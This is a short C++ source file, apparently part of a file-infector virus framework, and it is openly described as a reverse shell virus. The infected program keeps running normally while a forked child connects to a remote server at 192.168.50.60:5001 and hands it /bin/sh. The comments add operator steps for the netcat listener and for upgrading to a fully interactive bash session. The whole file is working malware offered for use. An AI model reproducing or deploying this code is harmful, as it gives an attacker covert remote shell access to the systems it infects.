#include "common/macros.hh"
#include "nostdlib/sys/socket.hh"
#include "nostdlib/unistd.hh"

// A simple reverse shell virus that spawns a process which gives a remote
// server shell access. The infected host will still run as is and terminate but
// the forked child will stay connected to our remote server.
// listen with:
//   nc -k -l 5001
// upgrade from shell to bash with:
//   SHELL=/bin/bash script -q /dev/null
// background the current shell with ^z
// update the local terminal line settings with stty2 and bring the remote shell
// back
//   stty raw -echo && fg
// reset terminal to type linux
//   reset
//   export TERM=xterm-256color
// You should then have a fully interactive shell with command history/auto
// complete + functional vim.
int main() {
  struct sockaddr_in sa;
  int s;

  sa.sin_family = AF_INET;
  // Connect to server
  sa.sin_addr.s_addr = vf::inet_addr(192, 168, 50, 60);
  sa.sin_port = htons(5001);

  s = vf::socket(AF_INET, SOCK_STREAM, 0);
  if (vf::connect(s, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
    // Give up if we cannot connect. To make things more sophisticated, we could
    // fork and sleep/retry periodically.
    return 0;
  }

  auto new_pid = vf::fork();
  // If we are parent or failed to fork return control to host.
  if (new_pid == 0) {
    if (vf::dup2(s, STDIN_FILENO) < 0 || vf::dup2(s, STDOUT_FILENO) < 0 ||
        vf::dup2(s, STDERR_FILENO) < 0) {
      return 0;
    }
    vf::execve(STR_LITERAL("/bin/sh"), nullptr, nullptr);
  }

  return 0;
}